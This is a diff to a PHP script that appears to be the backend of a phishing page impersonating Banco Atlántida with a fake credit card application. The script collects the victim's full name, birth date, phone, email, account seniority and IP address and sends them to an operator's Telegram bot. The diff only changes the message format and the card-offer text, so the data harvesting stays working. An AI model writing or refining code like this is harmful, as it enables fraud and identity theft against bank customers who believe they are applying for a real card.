@@ -28,17 +28,16 @@ $email      = trim($_POST['email']      ?? '');
 $antiguedad = trim($_POST['antiguedad'] ?? '');
 
 // Construir mensaje
-$msg  = "🏦 <b>NUEVA SOLICITUD — BANCO ATLÁNTIDA</b>\n";
-$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-$msg .= "👤 <b>Nombre:</b> " . htmlspecialchars($nombres . ' ' . $apellidos) . "\n";
-$msg .= "🎂 <b>Fecha Nac.:</b> " . htmlspecialchars($fechaNac) . "\n";
-$msg .= "📱 <b>Teléfono:</b> " . htmlspecialchars($phone) . "\n";
-$msg .= "📧 <b>Email:</b> " . htmlspecialchars($email) . "\n";
-$msg .= "🏛️ <b>Antigüedad:</b> " . htmlspecialchars($antiguedad) . "\n";
-$msg .= "━━━━━━━━━━━━━━━━━━━━\n";
-$msg .= "🌐 <b>IP:</b> {$ip}\n";
-$msg .= "🕒 <b>Fecha:</b> {$date}\n";
-$msg .= "📲 <b>UA:</b> " . substr($ua, 0, 80) . "\n";
+$msg  = "🏦 NUEVA SOLICITUD — BANCO ATLÁNTIDA\n";
+$msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
+$msg .= "👤 Nombre: " . ($nombres . ' ' . $apellidos) . "\n";
+$msg .= "📅 Fecha Nac: " . $fechaNac . "\n";
+$msg .= "📱 Teléfono: " . $phone . "\n";
+$msg .= "✉️ Correo: " . $email . "\n";
+$msg .= "🕐 Antigüedad: " . $antiguedad . "\n";
+$msg .= "🌐 IP: " . $ip . "\n";
+$msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
+$msg .= "✅ Solicito tarjeta de crédito Atlántida Black Infinite\n";
 
 // Identificador para los botones
 $uid = $nombres . ' ' . $apellidos;
@@ -57,7 +56,6 @@ $keyboard = json_encode([
 file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
     'chat_id'      => $chat_id,
     'text'         => $msg,
-    'parse_mode'   => 'HTML',
     'reply_markup' => $keyboard,
 ]));
 
